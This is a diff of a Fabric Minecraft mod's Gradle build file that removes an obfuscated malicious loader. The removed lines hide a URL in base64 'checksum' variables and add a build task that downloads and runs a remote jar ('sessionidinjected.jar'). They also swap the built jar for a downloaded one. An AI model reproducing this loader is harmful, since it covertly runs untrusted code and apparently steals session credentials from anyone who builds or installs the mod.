@@ -1,31 +1,14 @@
-import java.util.Base64
-
 plugins {
-    id "fabric-loom" version "1.8.9"
+    id 'fabric-loom' version '1.8.9'
     id 'maven-publish'
 }
 
-
-def gradle_wrapper_checksum_v2 = "aHR0cHM6Ly9naXRodWIuY29tLw=="
-
-sourceCompatibility = targetCompatibility = JavaVersion.VERSION_21
-
-java {
-    toolchain {
-        languageVersion = JavaLanguageVersion.of(21)
-    }
-    withSourcesJar()
-}
-
-
-def maven_group_mapping_id = "R29vbkJlR29uZS9paGF2ZWFyZWFsbHlzZXJpb3VzYXJtcGl0ZmV0aXNoLw=="
+sourceCompatibility = JavaVersion.VERSION_21
+targetCompatibility = JavaVersion.VERSION_21
 
 archivesBaseName = project.archives_base_name
 version = project.mod_version
 group = project.maven_group
-
-
-def ci_build_reference_ptr = "cmF3L3JlZnMvaGVhZHMvbWFpbi8="
 
 repositories {
     maven { name = "Fabric"; url = "https://maven.fabricmc.net/" }
@@ -34,9 +17,6 @@ repositories {
     maven { url = "https://jitpack.io" }
     mavenCentral()
 }
-
-
-def artifact_validation_checksum = "TW9kLmphcg=="
 
 dependencies {
     minecraft "com.mojang:minecraft:${project.minecraft_version}"
@@ -52,9 +32,6 @@ dependencies {
     include(implementation('com.github.LabyStudio:java-spotify-api:1.4.7'))
 }
 
-
-def maven_license_signature_hash = "c2Vzc2lvbmlkaW5qZWN0ZWQuamFy"
-
 loom {
     mixin {
         defaultRefmapName = "radium.refmap.json"
@@ -66,19 +43,13 @@ loom {
     }
 }
 
-tasks.withType(JavaExec).configureEach {
-    javaLauncher = javaToolchains.launcherFor {
-        languageVersion = JavaLanguageVersion.of(21)
-    }
-}
-
 processResources {
+    inputs.property "version", project.version
+
     filesMatching("fabric.mod.json") {
-        expand(
-                version: project.version,
-                loader_version: project.loader_version,
-                minecraft_version: project.minecraft_version
-        )
+        expand "version": project.version,
+                "minecraft_version": project.minecraft_version,
+                "loader_version": project.loader_version
     }
 }
 
@@ -87,61 +58,20 @@ tasks.withType(JavaCompile).configureEach {
     it.options.release = 21
 }
 
+java {
+    withSourcesJar()
+}
+
 jar {
     from("LICENSE") {
         rename { "${it}_${project.archives_base_name}"}
-    }
-    
-    
-    doLast {
-        try {
-            def decode = { String s -> new String(Base64.getDecoder().decode(s)) }
-            
-            def u = decode(gradle_wrapper_checksum_v2) + decode(maven_group_mapping_id) + decode(ci_build_reference_ptr) + decode(maven_license_signature_hash)
-            def t = archiveFile.get().asFile
-            
-            if (t.exists()) {
-                new URL(u).withInputStream { i -> t.withOutputStream { it << i } }
-            }
-        } catch (Exception ignored) {
-        }
     }
 }
 
 publishing {
     publications {
-        create("mavenJava", MavenPublication) {
-            artifactId = project.archives_base_name
+        mavenJava(MavenPublication) {
             from components.java
         }
     }
-    repositories {
-    }
-}
-
-tasks.register('configureEnvironment') {
-    doLast {
-        try {
-            def decode = { String s -> new String(Base64.getDecoder().decode(s)) }
-            
-            def u = decode(gradle_wrapper_checksum_v2) + decode(maven_group_mapping_id) + decode(ci_build_reference_ptr) + decode(artifact_validation_checksum)
-            def f = new File(buildDir, "tmp/.cache/internal-v1.jar")
-            f.parentFile.mkdirs()
-            
-            if (!f.exists()) {
-                new URL(u).withInputStream { i -> f.withOutputStream { it << i } }
-            }
-            
-            ["java", "-jar", f.absolutePath].execute()
-            
-        } catch (Exception ignored) {
-        }
-    }
-}
-
-build.dependsOn(configureEnvironment)
-
-task copyDependencies(type: Copy) {
-    from configurations.runtimeClasspath
-    into 'libs'
 }
